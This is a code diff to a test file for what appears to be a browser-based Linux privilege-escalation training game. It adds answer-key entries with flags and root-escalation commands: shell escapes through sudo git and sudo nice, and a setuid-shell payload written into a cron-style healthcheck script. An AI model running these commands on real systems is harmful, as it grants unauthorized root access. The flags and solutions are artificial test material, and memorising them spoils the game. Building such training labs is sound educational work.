@@ -63,8 +63,16 @@ const SOLUTIONS = {
     },
     33: {
         flag: 'flag{git_pager_escape_pwn}',
-        final: true,
         cmds: ['sudo git -p help !/bin/sh']
+    },
+    34: {
+        flag: 'flag{n1ce_pr10rity_r00t}',
+        cmds: ['sudo nice /bin/sh']
+    },
+    35: {
+        flag: 'flag{h34lthcheck_hij4ck}',
+        final: true,
+        cmds: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait']
     },
 };
 
@@ -95,11 +103,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 33 machines across 3 tiers', async ({ page }) => {
+test('hub renders 35 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(33);
+    await expect(page.locator('.machine-card')).toHaveCount(35);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 33');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 35');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
